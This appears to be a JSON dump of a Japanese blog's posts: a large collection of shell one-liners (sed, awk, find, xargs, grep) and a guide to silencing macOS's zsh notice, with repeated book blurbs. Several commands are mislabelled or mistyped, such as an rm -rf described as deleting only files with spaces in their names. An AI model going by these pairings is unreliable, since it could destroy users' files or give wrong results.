10\u0026#39; sed \u0026#39;5,10d\u0026#39; 最後の行を削除します。\nsed \u0026#39;$d\u0026#39; 最後の 2 行を削除します。\nsed \u0026#39;N;$!P;$!D;$d\u0026#39; 最後の 10 行を削除します。\nsed -e :a -e \u0026#39;$d;N;2,10ba\u0026#39; -e \u0026#39;P;D\u0026#39; # method 1 sed -n -e :a -e \u0026#39;1,10!{P;N;D;};N;ba\u0026#39; # method 2 8 行ごとに削除します。\ngsed \u0026#39;0~8d\u0026#39; # GNU sed only sed \u0026#39;n;n;n;n;n;n;n;d;\u0026#39; # other seds パターンに一致する行を削除:\nsed \u0026#39;/pattern/d\u0026#39; 空行をすべて削除します。\ngrep \u0026#39;.\u0026#39; sed \u0026#39;/^$/d\u0026#39; # method 1 sed \u0026#39;/./!d\u0026#39; # method 2 awk NF awk \u0026#39;/./\u0026#39; 最初の空白行を除くすべての連続する空白行を削除し、先頭と末尾のすべての空白行も削除します。\ncat -s sed \u0026#39;/./,/^$/!d\u0026#39; # method 1, allows 0 blanks at top, 1 at EOF sed \u0026#39;/^$/N;/\\n$/D\u0026#39; # method 2, allows 1 blank at top, 0 at EOF 最初の 2 行を除く連続する空白行をすべて削除します。\nsed \u0026#39;/^$/N;/\\n$/N;//D\u0026#39; 先頭の空白行をすべて削除します。\nsed \u0026#39;/./,$!d\u0026#39; 末尾の空白行をすべて削除します。\nsed -e :a -e \u0026#39;/^\\n*$/{$d;N;ba\u0026#39; -e \u0026#39;}\u0026#39; # works on all seds sed -e :a -e \u0026#39;/^\\n*$/N;/\\n$/ba\u0026#39; # dito, except for gsed 3.02.* 各段落の最後の行を削除します。\nsed -n \u0026#39;/^$/{p;h;};/./{x;/./p;}\u0026#39; 挿入 最初の行として挿入:\nsed \u0026#39;1 i foo 最初の行の後に (2 行目として) 挿入:\nsed \u0026#39;1 a foo\u0026#39; AAA を含む行の上に BBB を含む行を挿入します。\nsed \u0026#39;/AAA/i BBB\u0026#39; 文字列の作成 特定の長さの文字列を作成します (例: 513 スペースを生成)\nawk \u0026#39;BEGIN{while (a++\u0026lt;513) s=s \u0026#34; \u0026#34;; print s}\u0026#39; 特定の文字位置に特定の長さの文字列を挿入します (例 では、各入力行の列 6 の後に 49 個のスペースを挿入します)。\ngawk --re-interval \u0026#39;BEGIN{while(a++\u0026lt;49)s=s \u0026#34; \u0026#34;};{sub(/^.{6}/,\u0026#34;\u0026amp;\u0026#34; s)};1\u0026#39; 引用構文: 上記の例では、Unix プラットフォームでは通常 sed が使用されるため、編集コマンドを囲むために二重引用符 (\u0026quot;…\u0026quot;) の代わりに単一引用符 (\u0026rsquo;…\u0026rsquo;) を使用しています。\nSED スクリプトでの \u0026lsquo;\\t\u0026rsquo; の使用: ドキュメントを明確にするために、スクリプトでタブ文字 (0x09) を示すために表現 \\t を使用しました。\nただし、ほとんどのバージョンの sed は \\t の省略形を認識しないため、コマンドラインからこれらのスクリプトを入力するときは、代わりに TAB キーを押す必要があります。\nSED のバージョン: sed のバージョンが異なる場合、多少の構文の違いが予想されます。\n特に、編集コマンド内でのラベル (:name)、または分岐命令 (b,t) の使用は、コマンドの最後を除き、ほとんどサポートされていません。\nsed の一般的な GNU バージョンではより簡潔な構文が許可されています。\n次のようなかなり長いコマンドは、\nsed -e \u0026#39;/AAA/b\u0026#39; -e \u0026#39;/BBB/b\u0026#39; -e \u0026#39;/CCC/b\u0026#39; -e d GNU sed を使用すると、次のように書くことができます。\nsed \u0026#39;/AAA/b;/BBB/b;/CCC/b;d\u0026#39; # or even sed \u0026#39;/AAA\\|BBB\\|CCC/b;d\u0026#39; sed の多くのバージョンは「/one/s/RE1/RE2/」のようなコマンドを受け入れますが、「/one/! s/RE1/RE2/」で、「s」の前にスペースが含まれています。コマンドを入力するときは、スペースを省略してください。\n速度の最適化: 実行速度を上げる必要がある場合 (入力ファイルが大きい、プロセッサやハードディスクが遅いなどの理由で)、「s/…/…/」を指定する前に「find」式を指定すると、置換がより迅速に実行されます。\nsed \u0026#39;s/foo/bar/g\u0026#39; filename # standard replace command sed \u0026#39;/foo/ s/foo/bar/g\u0026#39; filename # executes more quickly sed \u0026#39;/foo/ s//bar/g\u0026#39; filename # shorthand sed syntax ファイルの最初の部分から行を出力するだけでよい行の選択または削除では、スクリプト内の「quit」コマンド (q) により、大きなファイルの処理時間が大幅に短縮されます。\nsed -n \u0026#39;45,50p\u0026#39; filename # print line nos. 45-50 of a file sed -n \u0026#39;51q;45,50p\u0026#39; filename # same, but executes much faster ワンライナーの定義 ワンライナーとして認定するには、コマンド ラインを ６５文字以下にする必要があります。\n書籍の紹介 UNIXという考え方—その設計思想と哲学 単行本 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2023-01-11T10:39:50+09:00","image":"https://suzukiiichiro.github.io/posts/2023-01-11-01-oneliner-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2023-01-11-01-oneliner-suzuki/","title":"【ちょいと便利な】シェルスクリプトワンライナー特集２【一行完結】"},{"content":"MacOSをアップデートしてから、ターミナルを開くたびに、「The default interactive shell is now zsh.」というメッセージが表示されるようになりました。 MacOSをCatalina以上にアップデートするとターミナルを開くたびに、「The default interactive shell is now zsh.」というメッセージが表示されるようになりました。\nというのも、Catalinaからデフォルトシェルがbashからzshに変更されたことに起因しています。\nそこでターミナルが、「デフォルトのインタラクティブシェルはzshになったからね」と教えてくれているというわけです。\n教えてくれるのはありがたいのですが、ターミナルを開くたびに毎回教えてくれるので、「もう知ってるよ・・・」「また言うの？」となってしまうのも辛いところです。\n内容 ターミナルを開くたびに表示されるテキストは以下のとおりです。\nThe default interactive shell is now zsh. To update your account to use zsh, please run `chsh -s /bin/zsh`. For more details, please visit https://support.apple.com/kb/HT208050. デフォルトのインタラクティブシェルはzshになりました。アカウントの設定を変更してzshを使うには、chsh -s /bin/zshを実行してください、といった内容です。\n言われたとおり、デフォルトのシェルをzshへ変更する場合 メッセージに表示されているコマンドchsh -s /bin/zshを、そのままターミナルに打ち込むだけです。\n$ chsh -s /bin/zsh 「The default interactive shell is now zsh.」を表示させない方法 デフォルトシェルを変更せずに、メッセージだけを表示させないようにする方法は、これまで通りデフォルトシェルは「bash」を使い続けたい、ということになります。\n多くの人はこれに該当すると思います。\nですので、対処としては、ターミナルを起動するたびに表示される以下のテキストを非表示にするということになろうかと思います。\nThe default interactive shell is now zsh. To update your account to use zsh, please run `chsh -s /bin/zsh`. For more details, please visit https://support.apple.com/kb/HT208050. 「~/.bash_profile」に追記する 「~/.bash_profile」もしくは「~/.profile」に、以下のコマンドを入力することで、メッセージを非表示にすることができます。\nexport BASH_SILENCE_DEPRECATION_WARNING=1 ~/.bash_profileに上記コマンドを書き込みたい場合は、以下のコマンドをターミナルに入力して、ターミナルを再ログインします。（~/.bash_profileがない場合は作られます。）\n$ echo \u0026#34;export BASH_SILENCE_DEPRECATION_WARNING=1\u0026#34; \u0026gt;\u0026gt; ~/.bash_profile 書籍の紹介 UNIXという考え方—その設計思想と哲学 単行本 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2023-01-10T11:39:43+09:00","image":"https://suzukiiichiro.github.io/posts/2023-01-10-01-chsh-suzuki/linux_hueec1b1e756b5511ebd26a37adc2ae307_89902_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2023-01-10-01-chsh-suzuki/","title":"MacOSをアップデートしてから、ターミナルを開くたびに、「The default interactive shell is now zsh.」というメッセージが表示されるようになりました。"},{"content":"ワンライナー ワンライナー（英：one liner）とは\n華麗な職人技によって処理を1行に全部詰め込んだ「1行ですべてが完結しているプログラムソース」のこと。\nfind 現在のディレクトリ内のすべてのサブディレクトリ/ファイルを一覧表示する find . 現在のディレクトリの下にあるすべてのファイルを一覧表示する find . -type f 現在のディレクトリの下にあるすべてのディレクトリを一覧表示する find . -type d 現在のディレクトリの下にあるすべてのファイルを編集します (たとえば、\u0026lsquo;www\u0026rsquo; を \u0026lsquo;ww\u0026rsquo; に置き換えます)。 find . -name \u0026#39;*.php\u0026#39; -exec sed -i \u0026#39;s/www/w/g\u0026#39; {} \\; ファイル名のみを検索して出力 (例: \u0026ldquo;mso\u0026rdquo;) find mso*/ -name M* -printf \u0026#34;%f\\n\u0026#34; システム内の大きなファイルを見つける (例: \u0026gt;4G) find / -type f -size +4G サイズが 74 バイト未満のファイルを見つけて削除する find . -name \u0026#34;*.mso\u0026#34; -size -74c -delete 空の (0 バイト) ファイルを見つける find . -type f -empty ディレクトリ内のすべてのファイルを再帰的にカウントする find . -type f | wc -l sort 列ごとにファイルを並べ替え、元の順序を維持する sort -k3,3 -s fold 指定された幅に収まるように各入力行を折り返す (例: 1 行あたり 4 つの整数) echo \u0026#34;00110010101110001101\u0026#34; | fold -w4 # 0011 # 0010 # 1011 # 1000 # 1101 expand タブをスペースに変換 expand filename スペースをタブに変換 unexpand filename wget ページから全てをダウンロード wget -r -l1 -H -t1 -nd -N -np -A mp3 -e robots=off http://example.com ファイル名を指定してダウンロード(長い名前の場合) wget -O filename \u0026#34;http://example.com\u0026#34; wget ファイルをフォルダーに wget -P /path/to/directory \u0026#34;http://example.com\u0026#34; tr 末尾の改行をエコーしない username=`echo -n \u0026#34;bashoneliner\u0026#34;` ファイルを複数のファイルにコピー (例: fileA をファイル (BD) にコピー) tee \u0026lt;fileA fileB fileC fileD \u0026gt;/dev/null すべての非印刷文字を削除する tr -dc \u0026#39;[:print:]\u0026#39; \u0026lt; filename 改行を削除 tr --delete \u0026#39;\\n\u0026#39; \u0026lt;input.txt \u0026gt;output.txt または\ntr -d \u0026#39;\\n\u0026#39; \u0026lt;input.txt \u0026gt;output.txt 改行を置換 tr \u0026#39;\\n\u0026#39; \u0026#39; \u0026#39; \u0026lt;filename 大文字/小文字へ tr /a-z/ /A-Z/ join 2 つのファイルをフィールドごとにタブで結合します (デフォルトでは両方のファイルの最初の列で結合し、デフォルトのセパレータはスペースです) join -t \u0026#39;\\t\u0026#39; fileA fileB 指定したフィールドを使用して結合します（例：fileAの３列目とfileBの５列目を結合） join -1 3 -2 5 fileA fileB paste 2 つ以上のファイルを列に結合/貼り付けます (例: fileA、fileB、fileC) paste fileA fileB fileC rev 逆文字列 echo 12345| rev ファイルの最後の列を切り取って取得する cat file|rev | cut -d/ -f1 | rev 最後の列を切り取る cat filename|rev|cut -f1|rev rename すべてのファイルの名前を変更します (たとえば、すべての .gz ファイルから ABC を削除します)。 rename \u0026#39;s/ABC//\u0026#39; *.gz すべてのファイルにファイル拡張子を追加します (例: .txt を追加) rename s/$/.txt/ * od ファイルを 8 進数で表示します ( od を使用して 16 進数、10 進数などを表示することもできます) od filename 10 進数から 2 進数 (例: 2 進数の 5 を取得) D2B=({0..1}{0..1}{0..1}{0..1}{0..1}{0..1}{0..1}{0..1}) echo -e ${D2B[5]} #00000101 echo -e ${D2B[255]} #11111111 grep 空行をカウントする cat filename.txt | grep -c \u0026#34;^$\u0026#34; または、\ncat filename.txt | grep \u0026#34;^$\u0026#34; | wc -l ヒント wc -lは、行数をカウントするwcコマンドです。 ^$の ^ は行頭、 $は行末、いわゆる行頭と行末の間になにもない、それは空白行と意味します。 空白行をwc -lでカウントするということになります。 単語とマッチしない行を表示 (例: \u0026lsquo;bbo\u0026rsquo;) cat filename.txt | grep -v bbo ヒント -vは、「ではない（マッチしない）」という意味になります。 一致する行番号を返す 検索文字列は(例: \u0026lsquo;bbo\u0026rsquo;) cat filename.txt | grep -c bbo 特定の文字列で始まらない行を表示 (例: #) cat filename.txt | grep -v \u0026#39;^#\u0026#39; ヒント ^は行頭という意味です。 大文字と小文字を区別しない grep (例: \u0026lsquo;bbo\u0026rsquo;/\u0026lsquo;BBO\u0026rsquo;/\u0026lsquo;Bbo\u0026rsquo;) cat filename.txt | grep -i \u0026#34;bbo\u0026#34; マッチに色を付けます (例: \u0026lsquo;bbo\u0026rsquo;)! cat filename.txt | grep --color bbo sed 特定の行を出力 (例: 123 行目) sed -n -e \u0026#39;123p\u0026#39; 行数を出力します (例: 10 行目から 33 行目) cat filename | sed -n \u0026#39;10,33p\u0026#39; n 行ごとに出力する cat filename | sed -n \u0026#39;0~3p\u0026#39; 奇数行ごとに出力 cat filename | sed -n \u0026#39;1~2p\u0026#39; 最初の行を含めて 3 行ごとに出力する cat filename | sed -n \u0026#39;1p;0~3p\u0026#39; 置換 (例: A を B に置き換える) cat filename | sed \u0026#39;s/A/B/g\u0026#39; ファイルを編集 (編集してファイルに保存) (例: \u0026lsquo;bbo\u0026rsquo; で行を削除してファイルに保存) sed -i \u0026#34;/bbo/d\u0026#34; filename 文字列を含む行を削除 (例: \u0026lsquo;bbo\u0026rsquo;) cat filename | sed \u0026#39;/bbo/d\u0026#39; 1行目を削除 cat filename | sed 1d 最初の１００行（１行目から１００行目まで）を削除 cat filename | sed 1,100d 文字列を含む行を削除 (例: \u0026lsquo;bbo\u0026rsquo;) cat filename | sed \u0026#34;/bbo/d\u0026#34; 空行の削除 cat filename | sed \u0026#39;/^\\s*$/d\u0026#39; または\ncat filename | sed \u0026#39;/^$/d\u0026#39; 最後の行を削除 cat filename | sed \u0026#39;$d\u0026#39; ファイルの末尾から最後の文字を削除 cat filename | sed -i \u0026#39;$ s/.$//\u0026#39; 先頭の空白とタブを削除 cat filename | sed -e \u0026#39;s/^[ \\t]*//\u0026#39; 先頭の空白のみを削除 cat filename | sed \u0026#39;s/ *//\u0026#39; 末尾のカンマを削除 cat filename | sed \u0026#39;s/,$//g\u0026#39; ２行に間の改行を削除 currentLine nextLine $ cat newline.xt | sed \u0026#39;:a;N;$!ba;s/\\n//g\u0026#39; $ currentLinenextLine $ ファイルの先頭に文字列を追加 (例: \u0026ldquo;[\u0026rdquo;) cat filename | sed -i \u0026#39;1s/^/[/\u0026#39; 特定の行番号に文字列を追加します (例: 1 行目と 3 行目に \u0026lsquo;something\u0026rsquo; を追加) cat filename | sed -e \u0026#39;1isomething\u0026#39; -e \u0026#39;3isomething\u0026#39; ファイルの末尾に文字列を追加 (例: \u0026ldquo;]\u0026rdquo;) cat filename | sed \u0026#39;$s/$/]/\u0026#39; 最後に改行を追加 cat filaname | sed \u0026#39;$a\\\u0026#39; すべての行の先頭に文字列を追加します (例: \u0026lsquo;bbo\u0026rsquo;) cat filename | sed -e \u0026#39;s/^/bbo/\u0026#39; 各行の末尾に文字列を追加します (例: \u0026ldquo;}\u0026rdquo;) cat filename | sed -e \u0026#39;s/$/\\}\\]/\u0026#39; n 番目の文字ごとに \\n を追加します (たとえば、4 番目の文字ごと) cat filename | sed \u0026#39;s/.\\{4\\}/\u0026amp;\\n/g\u0026#39; 最後に列を追加 for i in $(ls);do sed -i \u0026#34;s/$/\\t$i/\u0026#34; $i;done 空白行の操作 空行１行を空行２行に増やす\nsed G awk \u0026#39;1;{print \u0026#34;\u0026#34;}\u0026#39; awk \u0026#39;BEGIN{ORS=\u0026#34;\\n\\n\u0026#34;};1\u0026#39; 空行１行を空行３業に増やす\nsed \u0026#39;/^$/d;G\u0026#39; awk \u0026#39;NF{print $0 \u0026#34;\\n\u0026#34;}\u0026#39; 空行２行を空行１業に減らす\nsed \u0026#39;G;G\u0026#39; awk \u0026#39;1;{print \u0026#34;\\n\u0026#34;}\u0026#39; sed \u0026rsquo;n;d\u0026rsquo;\n一致するすべての行の上に空白行を挿入しますregex。\nsed \u0026lsquo;/regex/{x;p;x;}\u0026rsquo;\nに一致するすべての行の下に空白行を挿入しますregex。\nsed \u0026lsquo;/regex/G\u0026rsquo;\n正規表現に一致するすべての行の上下に空白行を挿入します。\nsed \u0026lsquo;/regex/{x;p;x;G;}\u0026rsquo;\n末尾に改行を追加します:\nsed \u0026lsquo;$a'\nawk タブをフィールドセパレータとして設定 awk -F $\u0026#39;\\t\u0026#39; タブ区切りとして出力 (フィールド区切りとしても) awk -v OFS=\u0026#39;\\t\u0026#39; 変数を渡す a=bbo;b=obb; awk -v a=\u0026#34;$a\u0026#34; -v b=\u0026#34;$b\u0026#34; \u0026#34;$1==a \u0026amp;\u0026amp; $10=b\u0026#34; filename 行番号と各行の文字数を出力する awk \u0026#39;{print NR,length($0);}\u0026#39; filename 列数を出力 awk \u0026#39;{print NF}\u0026#39; 列の順序を逆にする awk \u0026#39;{print $2, $1}\u0026#39; 列にコンマがあるかどうかを確認します (例: 列 $1) awk \u0026#39;$1~/,/ {print}\u0026#39; 列の先頭に文字列を追加します (たとえば、列 $3 に「chr」を追加します)。 awk \u0026#39;BEGIN{OFS=\u0026#34;\\t\u0026#34;}$3=\u0026#34;chr\u0026#34;$3\u0026#39; 文字列を含む行を削除 (例: \u0026lsquo;bbo\u0026rsquo;) awk \u0026#39;!/bbo/\u0026#39; file 最後の列を削除 awk \u0026#39;NF{NF-=1};1\u0026#39; file ファイルのすべての番号を四捨五入 (例: 有効数字 2 桁) awk \u0026#39;{while (match($0, /[0-9]+\\[0-9]+/)){ \\printf \u0026#34;%s%.2f\u0026#34;, substr($0,0,RSTART-1),substr($0,RSTART,RLENGTH) \\$0=substr($0, RSTART+RLENGTH) \\} \\print \\}\u0026#39; すべての行に番号/インデックスを付ける awk \u0026#39;{printf(\u0026#34;%s\\t%s\\n\u0026#34;,NR,$0)}\u0026#39; ファイルの平均 (ファイルの各行には 1 つの数値のみが含まれます) awk \u0026#39;{s+=$1}END{print s/NR}\u0026#39; フィールドの先頭を文字列で表示 (Linux など) awk \u0026#39;$1 ~ /^Linux/\u0026#39; 行を並べ替える (例: 1 40 35 12 23 –\u0026gt; 1 12 23 35 40) awk \u0026#39; {split( $0, a, \u0026#34;\\t\u0026#34; ); asort( a ); for( i = 1; i \u0026lt;= length(a); i++ ) printf( \u0026#34;%s\\t\u0026#34;, a[i] ); printf( \u0026#34;\\n\u0026#34; ); }\u0026#39; 前の行の値を減算します (column4 から最後の column5 を引いた値に等しい column6 を追加します) awk \u0026#39;{$6 = $4 - prev5; prev5 = $5; print;}\u0026#39; xargs タブを区切り文字として設定 (デフォルト: スペース) xargs -d\\t コマンドを実行する前にコマンドをプロンプトする ls|xargs -L1 -p head 1 行に 3 項目を表示 echo 1 2 3 4 5 6| xargs -n 3 # 1 2 3 # 4 5 6 実行前のプロンプト echo a b c |xargs -p -n 3 find の結果を rm する find . -name \u0026#34;*.html\u0026#34;|xargs rm ファイル名に空白が含まれるファイルを削除します (例: 「hello 2001」) find . -name \u0026#34;*.c\u0026#34; -print0|xargs -0 rm -rf ファイルをフォルダに移動 find . -name \u0026#34;*.bak\u0026#34; -print 0|xargs -0 -I {} mv {} ~/old または、\nfind . -name \u0026#34;*.bak\u0026#34; -print 0|xargs -0 -I file mv file ~/old 最初の 100 番目のファイルをディレクトリ (例: d1) に移動します。 ls |head -100|xargs -I {} mv {} d1 並行処理 time echo {1..5} |xargs -n 1 -P 5 sleep すべてのファイルを A から B にコピーします find /dir/to/A -type f -name \u0026#34;*.py\u0026#34; -print 0| xargs -0 -r -I file cp -v -p file --target-directory=/path/to/B ファイル名をファイルの最初の行に追加します ls |sed \u0026#39;s/.txt//g\u0026#39;|xargs -n1 -I file sed -i -e \u0026#39;1 i\\\u0026gt;file\\\u0026#39; file.txt すべてのファイルの行数を出力 ls |xargs -n1 wc -l 出力を 1 行にする ls -l| xargs すべてのファイルの行をカウントし、合計行もカウントします ls|xargs wc -l Xargs と grepを組み合わせる cat grep_list |xargs -I{} grep {} filename Xargs と sed (/etc ディレクトリの下のすべての古い IP アドレスを新しい IP アドレスに置き換えます) grep -rl \u0026#39;192.168.1.111\u0026#39; /etc | xargs sed -i \u0026#39;s/192.168.1.111/192.168.2.111/g\u0026#39; if 文字列一致の検出 if [[ \u0026#34;$c\u0026#34; == \u0026#34;read\u0026#34; ]]; then outputdir=\u0026#34;seq\u0026#34;; else outputdir=\u0026#34;write\u0026#34; ; fi myfile に文字列 \u0026rsquo;test\u0026rsquo; が含まれているかどうかを確認 ``` bah if grep -q hello myfile; then echo -e \u0026#34;file contains the string!\u0026#34; ; fi 変数がnull であるかを確認 myvariable=\u0026#34;\u0026#34;;if [ ! -s \u0026#34;myvariable\u0026#34; ]; then echo -e \u0026#34;variable is null!\u0026#34; ; fi 該当のファイルが存在するかを確認 if [ -e \u0026#39;filename\u0026#39; ];then echo -e \u0026#34;file exists!\u0026#34;; fi ファイルに加えてシンボリックリンクの存在も確認 if [ -e myfile ] || [ -L myfile ];then echo -e \u0026#34;file exists!\u0026#34;; fi xの値が５以上かどうかを確認 if [ \u0026#34;$x\u0026#34; -ge 5 ]; then echo -e \u0026#34;greater or equal than 5!\u0026#34; ; fi bash版：xの値が５以上かどうかを確認 if ((x \u0026gt;= 5)); then echo -e \u0026#34;greater or equal than 5!\u0026#34; ; fi (( )) を使う j=3;u=1;if ((j==u+2)); then echo -e \u0026#34;j==u+2\u0026#34;;fi [[ ]] を使う age=25;if [[ $age -gt 21 ]]; then echo -e \u0026#34;forever 21\u0026#34; ; fi for ディレクトリ内のファイル名を出力 for i in 